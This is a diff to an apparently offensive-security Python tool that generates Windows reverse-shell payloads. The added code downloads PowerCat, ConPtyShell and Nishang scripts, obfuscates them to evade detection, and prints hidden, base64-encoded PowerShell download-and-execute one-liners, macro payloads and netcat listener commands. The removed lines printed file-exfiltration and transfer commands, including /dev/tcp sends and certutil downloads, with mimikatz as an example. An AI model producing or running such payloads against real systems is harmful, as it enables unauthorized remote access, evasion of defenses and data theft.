@@ -198,11 +198,32 @@ def print_powercat(ip, port, use_macro, use_obfuscate):
     
 
     if use_obfuscate:
-        file = pyfuscate(file, var, par, funct)
+        file = pyfuscate(file, var, par, funct, ip, port)
         ps1 = os.path.basename(file)
-        #print(file)
-        #print(ps1)
-    
+        file = file.lstrip('./')
+
+        print("\n********** PowerCat Download & IEX Obfuscated **********\n")
+        payload = f"IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/{file}')"
+        print(payload)
+
+        print("\n********** PowerCat Download & IEX b64 Obfuscated **********\n")
+        p64 = build(payload)
+        print(f"powershell -nop -w hidden -enc {p64}")
+
+        
+        if use_macro:
+            print("\n\n********** Powercat reverse shell base64 Macro Obfuscated **********\n")
+            macro(p64)
+
+        print(f"\n\n\n\tDONT'T FORGET !!")
+        print(f"\trlwrap -cAr nc -nlvp {port}")
+        print(f"\tpython3 -m uploadserver 80\n")
+
+
+
+        sys.exit(0)
+
+
     print("\n********** PowerCat payload **********\n")
     payload = f"{ps1} -c {ip} -p {port} -e powershell"
     print(payload)
@@ -240,6 +261,41 @@ def print_powercat(ip, port, use_macro, use_obfuscate):
 
 def print_conpty(ip, port, rows, columns, use_macro, use_obfuscate):
 
+    file = "Invoke-ConPtyShell.ps1"
+
+    if not os.path.exists(file):
+        print("Invoke-ConPtyShell.ps1 no encontrado. Descargando...")
+        subprocess.run(["wget", "https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1"], check=True)
+
+    else:
+        print("Invoke-ConPtyShell.ps1 ya está presente en el directorio.")
+
+
+    if use_obfuscate:
+        file = pyfuscate(file, var, par, funct, ip, port)
+        ps1 = os.path.basename(file)
+        file = file.lstrip('./')
+        print("\n********** PowerCat Download & IEX **********\n")
+        payload = f"IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/{file}')"
+        print(payload)
+
+        print("\n********** PowerCat Download & IEX b64 **********\n")
+        p64 = build(payload)
+        print(f"powershell -nop -w hidden -enc {p64}")
+
+        if use_macro:
+            print("\n\n********** Powercat reverse shell base64 Macro Obfuscated **********\n")
+            macro(p64)
+
+        print(f"\n\n\n\tDONT'T FORGET !!")
+        print(f"\trlwrap -cAr nc -nlvp {port}")
+        print(f"\tpython3 -m uploadserver 80\n")
+
+
+        sys.exit(0)
+
+
+
     print("\n********** ConPtyShell RevShell **********\n")
     pay = f"Invoke-ConPtyShell -RemoteIp {ip} -RemotePort {port} -Rows {rows} -Cols {columns}"
     print(pay)
@@ -265,9 +321,6 @@ def print_conpty(ip, port, rows, columns, use_macro, use_obfuscate):
     pay = f"IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell -RemoteIp {ip} -RemotePort {port} -Rows {rows} -Cols {columns}"
     print(pay)
     
-    if use_obfuscate:
-        pay = obfuscate(pay)
-
     pay = build(pay)
 
     if use_macro:
@@ -284,6 +337,42 @@ def print_conpty(ip, port, rows, columns, use_macro, use_obfuscate):
 
 
 def print_nishang(ip, port, use_macro):
+
+
+    file = "Invoke-PowerShellTcp.ps1"
+
+    if not os.path.exists(file):
+        print("Invoke-PowerShellTcp.ps1 no encontrado. Descargando...")
+        subprocess.run(["wget", "https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1"], check=True)
+
+    else:
+        print("Invoke-PowerShellTcp.ps1 ya está presente en el directorio.")
+
+
+    if use_obfuscate:
+        file = pyfuscate(file, var, par, funct, ip, port)
+        ps1 = os.path.basename(file)
+        file = file.lstrip('./')
+        print("\n********** PowerCat Download & IEX **********\n")
+        payload = f"IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/{file}')"
+        print(payload)
+
+        print("\n********** PowerCat Download & IEX b64 **********\n")
+        p64 = build(payload)
+        print(f"powershell -nop -w hidden -enc {p64}")
+
+        
+        if use_macro:
+            print("\n\n********** Powercat reverse shell base64 Macro Obfuscated **********\n")
+            macro(p64)
+
+        print(f"\n\n\n\tDONT'T FORGET !!")
+        print(f"\trlwrap -cAr nc -nlvp {port}")
+        print(f"\tpython3 -m uploadserver 80\n")
+
+
+        sys.exit(0)
+
 
     print("\n********** Nishang payload **********\n")
     payload = f"Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}"
@@ -382,128 +471,7 @@ def print_nc(ip, port):
 
     print(f"More shells at: /usr/share/webshells\n")
 
-def print_paths():
-
-        print("\n********** Windows **********\n")
-        print(f"C:\Windows\Tasks") 
-        print(f"C:\Windows\Temp")
-        print(f"C:\windows\\tracing")
-        print(f"C:\Windows\Registration\CRMLog")
-        print(f"C:\Windows\System32\FxsTmp")
-        print(f"C:\Windows\System32\com\dmp")
-        print(f"C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys")
-        print(f"C:\Windows\System32\spool\PRINTERS")
-        print(f"C:\Windows\System32\spool\SERVERS")
-        print(f"C:\Windows\System32\spool\drivers\color")
-        print(f"C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter")
-        print(f"C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)")
-        print(f"C:\Windows\SysWOW64\FxsTmp")
-        print(f"C:\Windows\SysWOW64\com\dmp")
-        print(f"C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter")
-        print(f"C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System")
-
-        
-        print("\n********** Linux **********\n")
-        print(f"find / -writable -type d 2>/dev/null")
-        print(f"/tmp")
-        print(f"/dev/shm")
-
-        print("\n********** Grant perm **********\n")
-        print(f"icacls C:\Windows\Temp /grant Everyone:(OI)(CI)F")
-        print(f"chmod +w .")
-
-
-
-def print_trans(ip, port, protocol, file):
-
-
-    
-    def ftp(ip, port):
-        print(f"python -m pyftpdlib -p{port} -w")
-        print(f"ftp {ip}")
-
-    def scp(ip, file, port):
-
-        print(f"To copy a file over from local host to a remote host")
-        print(f"scp ./{file} user@{ip}:/tmp/{file} -p {port}")
-        print(f"To copy a file from a remote host to your local host")
-        print(f"scp user@{ip}:/tmp/{file} ./{file}")
-        print(f"To copy over a directory from your local host to a remote host")
-        print(f"scp -r directory user@{ip}:./{file}")
-
-    def socat(ip, port, file):
-        print(f"socat -u FILE:'{file}' TCP-LISTEN:{port},reuseaddr")
-        print(f"socat -u TCP:{ip}:{port} STDOUT > {file}")
-
-
-    def nc(ip, port, file):
-
-        print(f"\n********** Listener **********\n")
-        print(f"nc -nlvp {port} > {file}")
-
-        print(f"\n********** Send **********\n")
-        print(f"cat < {file} > /dev/tcp/{ip}/{port}")
-        print(f"nc -w 3 {ip} {port} < {file}")
-
-
-    def http(ip, port, file):
-
-        port_f = f":{port}"
-        print("\n********** HTTP **********\n")
-
-        print("\n********** Listeners **********\n")
-
-        print(f"php -S 0.0.0.0{port_f}")
-        print("ruby -run -e httpd . -p {port}")
-
-        print(f"python -m SimpleHTTPServer {port}")
-        print(f"python2 -m SimpleHTTPServer {port}")
-        print(f"python3 -m http.server {port}")
-
-        print(f"python3 -m uploadserver {port}")
-        print(f"python3 -m uploadserver --basic-auth $SUDO_USER:Password123")
-        
-        print("\n********** Upload **********\n")
-        print(f"curl -X POST http://{ip}{port_f}/upload -F 'files=@{file}'")
-
-
-        print("\n********** Windows Download **********\n")
-        print(f"certutil.exe -f -urlcache -split http://{ip}{port}/{file}")
-        print(f"certutil -decode payload.b64 payload.dll")
-        print(f"certutil -encode payload.dll payload.b64")
-        print(f"curl http://{ip}{port_f}/{file} -o {file}")
-        print(f"wget http://{ip}{port_f}/{file} -OutFile {file}")
-        print(f"iwr -uri http://{ip}{port_f}/{file} -OutFile {file}")
-        print(f"iwr -UseBasicParsing http://{ip}{port_f}/{file}")
-        print(f"enable TLS:")
-        print(f"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12")
-
-        print("\n********** Linux Download **********\n")
-        print(f"wget {ip}:{port} {file}")
-        print(f"curl http://{ip}:{port}/{file} --output {file}")
-
-    def smb(ip, file, port):
-
-        print("\n********** SMB share **********\n\n")
-        print(f"wsgidav --host=0.0.0.0 --port={port} --auth=anonymous --root /home/$SUDO_USER/webdav")
-        print(f"impacket-smbserver share $(pwd) -smb2support")
-        print(f"smbserver.py -smb2support share .")
-
-        print("Bring from the remote host to our machine")
-        print(f"copy .\{file} \\{ip}\share\{file}")
-        print(f"Upload to remote host")
-        print(f"copy \\{ip}\share\{file} .\{file}")
-       
-        print("\nCreate a logical unit")
-        print(f"net use x: \\{ip}\share /user:$SUDO_USER Password123")
-        print("Bring from the remote host to our machine")
-        print(f"copy .\{file} x:\{file}")
-        print(f"Upload to remote host")
-        print(f"copy x:\{file} .\{file}")
-
-    if protocol == "-paths":
-        paths()
-    elif protocol == "-installs":
+    if protocol == "-installs":
         installs()
     elif protocol == "-ftp":
         ftp(ip, port)
@@ -530,24 +498,11 @@ def shellpy_help():
     print(f"\t\tshellpy 192.168.1.72 4444 -php")
     print(f"\t\tshellpy 192.168.1.72 4444 -powershell")
     print(f"\t\tshellpy 192.168.1.72 4444 -nishang --macro")
-    print(f"\t\tshellpy 192.168.1.72 4444 -powershell --macro --obfuscate")
+    print(f"\t\tshellpy 192.168.1.72 4444 -powercat --macro --obfuscate")
     print(f"\t\tshellpy 192.168.1.72 4444 -conpty 54 118")
 
-    print(f"\n\tFile transfer")
-    print("\n\tUsage: shell <IP> <PORT> -trans <PROTOCOL> <FILE>")
-    print("\n\tThe file transfer functions require installing the following libraries:")
-    print("\n\t\tpip3 install wsgidav")
-    print("\t\tpip install pyftpdlib")
-    print("\t\tpip install updog")
-    print("\t\tpython3 -m pip install --user uploadserver")
-    print("\n\tTransfers: \n\n\t\t-paths \n\t\t-installs \n\t\t-ftp \n\t\t-scp \n\t\t-socat \n\t\t-nc \n\t\t-http \n\t\t-smb ")
-    print("\n\tExamples:\n")
-    print(f"\t\tshellpy -paths")
-    print(f"\t\tshellpy 192.168.45.170 4444 -trans -smb rubeus.exe")
-    print(f"\t\tshellpy 192.168.45.170 4444 -trans -http mimikatz.exe")
     
     sys.exit(1)
-
 
 
 
@@ -742,7 +697,7 @@ def randomString(iFile):
         string = ''.join(e for e in line if e.isalnum())
         return string
 
-def pyfuscate(file, var, par, func):
+def pyfuscate(file, var, par, func, ip, port):
     
     iFile = file
 
@@ -755,6 +710,11 @@ def pyfuscate(file, var, par, func):
     fFile = oDir + "/" + ts + ".functions"
     pFile = oDir + "/" + ts + ".parameters"
     shutil.copy(iFile, oFile)
+
+    powercat_command = f"powercat -c {ip} -p {port} -e powershell"
+
+    with open(oFile, "a") as file:
+        file.write("\n" + powercat_command)
 
     obfuVAR     = dict()
     obfuPARMS   = dict()
@@ -848,9 +808,7 @@ def main(use_macro, use_obfuscate):
                 print("Error: --macro can only be used with -powercat, -nishang, -powershell, or -conpty.")
                 sys.exit(1)
 
-        print_listener(port)
-        print_tty()
-
+        
     if shell_type == "-powershell":
         print_powershell(ip, port, use_macro, use_obfuscate)
     elif shell_type == "-powercat":
@@ -867,8 +825,6 @@ def main(use_macro, use_obfuscate):
         print_perl(ip, port)
     elif shell_type == "-nc":
         print_nc(ip, port)
-    elif shell_type == "-trans":
-        print_trans(ip, port, protocol, file)
     else:
         print(f"Shell type '{shell_type}' not recognized.")
 
